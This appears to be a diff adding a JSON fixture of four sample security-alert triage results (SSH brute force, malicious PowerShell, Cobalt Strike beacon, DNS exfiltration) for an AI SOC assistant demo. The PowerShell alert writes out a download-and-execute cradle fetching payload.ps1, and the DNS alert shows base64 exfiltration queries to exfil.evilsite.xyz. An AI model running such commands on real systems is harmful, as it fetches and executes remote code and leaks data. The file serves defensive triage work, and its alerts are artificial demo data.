@@ -1,0 +1,61 @@
+{
+  "_note": "These are triage OUTPUTS (the schema soc-triage-tool's analyzeOffline() produces), not raw logs. They reuse soc-triage-tool's built-in sample alerts run through its own rule engine, so the AI SOC Copilot demo starts from a realistic, already-classified alert exactly as it would arrive from that tool.",
+  "alerts": [
+    {
+      "id": "ssh-brute-force",
+      "severity": "CRITICAL",
+      "log_format_detected": "Syslog",
+      "summary": "Brute-force SSH attack: 6 failed attempts against privileged account(s) (root, admin) from 185.220.101.45. Root targeting indicates automated attack with privilege-escalation intent.",
+      "threat_type": "Brute Force",
+      "mitre_tactic": "Credential Access",
+      "mitre_technique": "T1110.001 - Brute Force: Password Guessing",
+      "iocs": ["185.220.101.45", "user:root", "user:admin"],
+      "recommended_action": "Block 185.220.101.45 at the firewall immediately. Verify no \"Accepted password\" entries follow in auth.log. Enable fail2ban. Rotate credentials for targeted accounts.",
+      "false_positive_likelihood": "Low",
+      "confidence": 95,
+      "analyst_notes": ""
+    },
+    {
+      "id": "malicious-powershell",
+      "severity": "CRITICAL",
+      "log_format_detected": "Windows Event Log",
+      "summary": "Malicious PowerShell on DESKTOP-A7K2P (user: CORP\\jsmith). Script uses download cradle / in-memory execution (IEX/WebClient/EncodedCommand) — common loader technique for second-stage payloads.",
+      "threat_type": "Malicious PowerShell",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1059.001 - PowerShell",
+      "iocs": ["user:CORP\\jsmith", "host:DESKTOP-A7K2P", "cmd:IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.200/payload.ps1')"],
+      "recommended_action": "Isolate DESKTOP-A7K2P. Decode full script block. Hunt for C2 IPs across environment. Check persistence (Run keys, scheduled tasks).",
+      "false_positive_likelihood": "Low",
+      "confidence": 93,
+      "analyst_notes": ""
+    },
+    {
+      "id": "cobalt-strike-c2",
+      "severity": "CRITICAL",
+      "log_format_detected": "Suricata JSON",
+      "summary": "Cobalt Strike beacon activity detected from internal host 10.0.0.22 to 198.51.100.45:443. Cobalt Strike is a commercial offensive framework widely used in targeted attacks and ransomware operations.",
+      "threat_type": "Cobalt Strike C2",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1071.001 - Web Protocols",
+      "iocs": ["10.0.0.22", "198.51.100.45", "port:443", "sig:ET MALWARE Possible Cobalt Strike Beacon Activity"],
+      "recommended_action": "Isolate 10.0.0.22 immediately. Capture memory. Block 198.51.100.45 at perimeter. Hunt all hosts communicating with 198.51.100.45. Escalate to IR.",
+      "false_positive_likelihood": "Low",
+      "confidence": 92,
+      "analyst_notes": ""
+    },
+    {
+      "id": "dns-exfiltration",
+      "severity": "HIGH",
+      "log_format_detected": "DNS Log",
+      "summary": "DNS exfiltration detected: Base64-encoded subdomains sent to exfil.evilsite.xyz. Stolen data is encoded into DNS query labels to bypass DLP controls. High subdomain entropy confirms anomalous usage.",
+      "threat_type": "DNS Exfiltration",
+      "mitre_tactic": "Exfiltration",
+      "mitre_technique": "T1048.003 - Exfiltration Over DNS",
+      "iocs": ["10.0.0.45", "dns:aGVsbG93b3JsZA==.exfil.evilsite.xyz", "dns:dGhpcyBpcyBhIHRlc3Q=.exfil.evilsite.xyz"],
+      "recommended_action": "Sinkhole the destination domain at DNS resolver. Identify source host (10.0.0.45). Decode subdomain labels to determine exfiltrated data. Hunt for the implant on the source.",
+      "false_positive_likelihood": "Low",
+      "confidence": 90,
+      "analyst_notes": ""
+    }
+  ]
+}
